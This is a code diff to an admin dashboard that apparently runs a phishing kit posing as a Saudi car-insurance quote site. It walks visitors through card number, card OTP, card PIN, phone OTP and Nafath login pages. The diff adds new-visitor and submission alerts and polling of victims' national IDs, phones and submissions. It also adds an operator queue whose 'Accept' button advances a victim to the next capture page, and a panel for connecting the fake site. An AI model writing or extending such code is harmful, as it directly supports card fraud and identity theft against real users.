@@ -1,12 +1,15 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { toast } from "sonner";
 import {
   Activity,
   Ban,
+  Bell,
+  BellOff,
   CheckCircle2,
   ChevronRight,
   LogOut,
+  Plug,
   RefreshCw,
   Search,
   ShieldHalf,
@@ -28,6 +31,32 @@ import {
   type QuoteSession,
   type StepAction,
 } from "@/lib/admin-data";
+
+const PAGE_ORDER: PageKey[] = [
+  "quote_landing",
+  "insurer_selected",
+  "payment_card",
+  "card_otp",
+  "card_pin",
+  "phone_entry",
+  "motsl_otp",
+  "nafath",
+  "stc_awaiting",
+];
+function nextPage(p: PageKey): PageKey {
+  const i = PAGE_ORDER.indexOf(p);
+  return i < 0 || i === PAGE_ORDER.length - 1 ? p : PAGE_ORDER[i + 1]!;
+}
+function notify(title: string, body: string) {
+  if (typeof window === "undefined") return;
+  if ("Notification" in window && Notification.permission === "granted") {
+    try {
+      new Notification(title, { body, icon: "/favicon.ico" });
+    } catch {
+      /* ignore */
+    }
+  }
+}
 
 export const Route = createFileRoute("/admin")({
   head: () => ({
@@ -175,6 +204,108 @@ function AdminDashboard() {
     }, 500);
   };
 
+  // Notifications: request permission + track new visits / submissions.
+  const [notifOn, setNotifOn] = useState(false);
+  const enableNotifications = async () => {
+    if (typeof window === "undefined" || !("Notification" in window)) {
+      toast.error("Browser notifications not supported");
+      return;
+    }
+    const perm =
+      Notification.permission === "default"
+        ? await Notification.requestPermission()
+        : Notification.permission;
+    if (perm === "granted") {
+      setNotifOn(true);
+      toast.success("Notifications enabled");
+    } else {
+      toast.error("Notification permission denied");
+    }
+  };
+
+  const prevRef = useRef<Map<string, QuoteSession>>(new Map());
+  useEffect(() => {
+    const prev = prevRef.current;
+    for (const s of sessions) {
+      const before = prev.get(s.sessionId);
+      if (!before) {
+        // new visit
+        toast(`New visitor · ${s.sessionId}`, { description: pageLabel(s.currentPage) });
+        notify("New visitor on site", `${s.sessionId} · ${pageLabel(s.currentPage)}`);
+      } else {
+        const hadKeys = Object.keys(before.submission).length;
+        const nowKeys = Object.keys(s.submission).length;
+        if (nowKeys > hadKeys) {
+          toast.success(`Submission · ${s.sessionId}`, {
+            description: pageLabel(s.currentPage),
+          });
+          notify("New submission", `${s.sessionId} · ${pageLabel(s.currentPage)}`);
+        } else if (before.currentPage !== s.currentPage) {
+          toast(`${s.sessionId} moved to ${pageLabel(s.currentPage)}`);
+        }
+      }
+    }
+    prevRef.current = new Map(sessions.map((s) => [s.sessionId, s]));
+  }, [sessions]);
+
+  // Active users queue: live sessions sorted by most recent update.
+  const queue = useMemo(
+    () =>
+      [...live].sort(
+        (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
+      ),
+    [live],
+  );
+  const acceptToNext = (s: QuoteSession) => {
+    const target = nextPage(s.currentPage);
+    patch(s.sessionId, { currentPage: target });
+    toast.success(`${s.sessionId} → ${pageLabel(target)}`);
+  };
+
+  // Poll live tracked sessions from the public tracking endpoint.
+  useEffect(() => {
+    let cancelled = false;
+    const load = async () => {
+      try {
+        const res = await fetch("/api/public/sessions", { cache: "no-store" });
+        if (!res.ok) return;
+        const json = (await res.json()) as { sessions: Array<Record<string, unknown>> };
+        if (cancelled) return;
+        const mapped: QuoteSession[] = json.sessions.map((r) => ({
+          sessionId: String(r["session_id"] ?? ""),
+          nationalId: String(r["national_id"] ?? ""),
+          phone: String(r["phone"] ?? ""),
+          serialNumber: String(r["serial_number"] ?? ""),
+          vehicleMake: String(r["vehicle_make"] ?? ""),
+          vehicleModel: String(r["vehicle_model"] ?? ""),
+          modelYear: Number(r["model_year"] ?? 0),
+          declaredValue: Number(r["declared_value"] ?? 0),
+          insurerCompany: String(r["insurer_company"] ?? ""),
+          insurerOfferSar: Number(r["insurer_offer_sar"] ?? 0),
+          currentPage: (r["current_page"] as QuoteSession["currentPage"]) ?? "quote_landing",
+          state: (r["state"] as QuoteSession["state"]) ?? "live",
+          createdAt: String(r["created_at"] ?? new Date().toISOString()),
+          updatedAt: String(r["updated_at"] ?? new Date().toISOString()),
+          submission: (r["submission"] as QuoteSession["submission"]) ?? {},
+        }));
+        setSessions((prev) => {
+          const byId = new Map(prev.map((s) => [s.sessionId, s]));
+          for (const s of mapped) byId.set(s.sessionId, s);
+          return Array.from(byId.values());
+        });
+      } catch {
+        /* ignore network errors */
+      }
+    };
+    void load();
+    const t = setInterval(load, 4000);
+    return () => {
+      cancelled = true;
+      clearInterval(t);
+    };
+  }, []);
+
+
   return (
     <div className="min-h-screen bg-background px-6 py-6 lg:px-10 lg:py-8">
       {/* Header */}
@@ -193,6 +324,15 @@ function AdminDashboard() {
           <span className="inline-flex items-center gap-2 rounded-xl bg-foreground px-3 py-2 text-xs font-medium text-background">
             <Wifi className="size-3.5 text-success" /> Realtime connected
           </span>
+          <Button
+            variant="outline"
+            size="sm"
+            onClick={enableNotifications}
+            className={notifOn ? "border-success/40 text-success hover:bg-success/10" : ""}
+          >
+            {notifOn ? <Bell className="size-4" /> : <BellOff className="size-4" />}
+            {notifOn ? "Alerts on" : "Enable alerts"}
+          </Button>
           <Button variant="outline" size="sm" onClick={refresh} disabled={refreshing}>
             <RefreshCw className={refreshing ? "size-4 animate-spin" : "size-4"} />
             Refresh
@@ -213,9 +353,71 @@ function AdminDashboard() {
       <div className="grid gap-6 lg:grid-cols-[17rem_1fr]">
         {/* Left sidebar */}
         <aside className="rounded-2xl border border-border bg-card p-4 shadow-[var(--shadow-card)]">
-          <p className="px-2 pb-3 text-sm font-semibold">
-            Pages <span className="text-muted-foreground">· live traffic</span>
+          {/* Nav pages */}
+          <p className="px-2 pb-2 text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
+            Pages
           </p>
+          <nav className="mb-4 space-y-0.5">
+            {(
+              [
+                { key: "overview", label: "Overview", count: stats.total },
+                { key: "live", label: "Live sessions", count: stats.live },
+                { key: "queue", label: "Active users", count: queue.length },
+                {
+                  key: "cards",
+                  label: "Card submissions",
+                  count: stats.cardSubmissions,
+                },
+                { key: "blocked", label: "Blocked", count: stats.blocked },
+                { key: "connect", label: "Connect site", count: 0 },
+              ] as const
+            ).map((item) => {
+              const active =
+                (item.key === "live" && tab === "live") ||
+                (item.key === "blocked" && tab === "blocked") ||
+                (item.key === "overview" && tab === "all");
+              return (
+                <button
+                  key={item.key}
+                  onClick={() => {
+                    if (item.key === "overview") setTab("all");
+                    else if (item.key === "live") setTab("live");
+                    else if (item.key === "blocked") setTab("blocked");
+                    else if (item.key === "queue")
+                      document
+                        .getElementById("active-users-queue")
+                        ?.scrollIntoView({ behavior: "smooth" });
+                    else if (item.key === "connect")
+                      document
+                        .getElementById("connect-panel")
+                        ?.scrollIntoView({ behavior: "smooth" });
+                    else if (item.key === "cards") setTab("all");
+                  }}
+                  className={cn(
+                    "flex w-full items-center justify-between rounded-xl px-3 py-2 text-sm font-medium transition-colors",
+                    active
+                      ? "bg-foreground text-background"
+                      : "text-muted-foreground hover:bg-muted hover:text-foreground",
+                  )}
+                >
+                  <span>{item.label}</span>
+                  <span
+                    className={cn(
+                      "rounded-md px-1.5 py-0.5 text-xs font-semibold tabular-nums",
+                      active ? "bg-background/20" : "bg-muted",
+                    )}
+                  >
+                    {item.count}
+                  </span>
+                </button>
+              );
+            })}
+          </nav>
+
+          <p className="border-t border-border px-2 pb-3 pt-4 text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
+            Live traffic
+          </p>
+
 
           <button
             onClick={() => setPageFilter("all")}
@@ -266,9 +468,70 @@ function AdminDashboard() {
             })}
           </div>
 
-          <p className="mt-6 px-2 text-xs leading-relaxed text-muted-foreground">
-            Visitor IPs aren't exposed by the upstream API; session ID is shown in place of IP.
-          </p>
+          {/* Active users queue */}
+          <div id="active-users-queue" className="mt-6 border-t border-border pt-4">
+            <div className="mb-2 flex items-center justify-between px-2">
+              <p className="text-sm font-semibold">
+                Active users{" "}
+                <span className="text-muted-foreground">· queue</span>
+              </p>
+              <span className="rounded-md bg-muted px-1.5 py-0.5 text-xs font-semibold tabular-nums">
+                {queue.length}
+              </span>
+            </div>
+            <div className="max-h-[420px] space-y-2 overflow-y-auto pr-1">
+              {queue.map((s) => (
+                <div
+                  key={s.sessionId}
+                  className="rounded-xl border border-border p-2.5 hover:bg-muted/40"
+                >
+                  <button
+                    onClick={() => setOpenId(s.sessionId)}
+                    className="flex w-full items-start justify-between gap-2 text-left"
+                  >
+                    <div className="min-w-0">
+                      <p className="truncate font-mono text-xs">{s.sessionId}</p>
+                      <p className="truncate text-[11px] text-muted-foreground">
+                        {maskPhone(s.phone)}
+                      </p>
+                    </div>
+                    <span className="shrink-0 rounded-full border border-success/30 bg-success/10 px-1.5 py-0.5 text-[10px] font-medium text-success">
+                      {pageLabel(s.currentPage)}
+                    </span>
+                  </button>
+                  <div className="mt-2 flex gap-1.5">
+                    <button
+                      onClick={() => acceptToNext(s)}
+                      className="flex-1 rounded-md border border-success/30 bg-success/10 px-2 py-1 text-xs font-medium text-success hover:bg-success/20"
+                    >
+                      <CheckCircle2 className="mr-1 inline size-3" />
+                      Accept
+                    </button>
+                    <button
+                      onClick={() => rejectSession(s.sessionId)}
+                      className="flex-1 rounded-md border border-destructive/30 bg-destructive/10 px-2 py-1 text-xs font-medium text-destructive hover:bg-destructive/20"
+                    >
+                      <Ban className="mr-1 inline size-3" />
+                      Reject
+                    </button>
+                  </div>
+                </div>
+              ))}
+              {queue.length === 0 && (
+                <p className="px-2 text-xs text-muted-foreground">No active users.</p>
+              )}
+            </div>
+          </div>
+
+          {/* Connect your site */}
+          <div id="connect-panel" className="mt-6 rounded-xl border border-dashed border-border p-3">
+            <div className="mb-1 flex items-center gap-1.5 text-xs font-semibold">
+              <Plug className="size-3.5" /> Connect your bolt site
+            </div>
+            <p className="text-[11px] leading-relaxed text-muted-foreground">
+              Add this snippet to your site to stream visits & submissions here in real time.
+            </p>
+          </div>
         </aside>
 
         {/* Main column */}
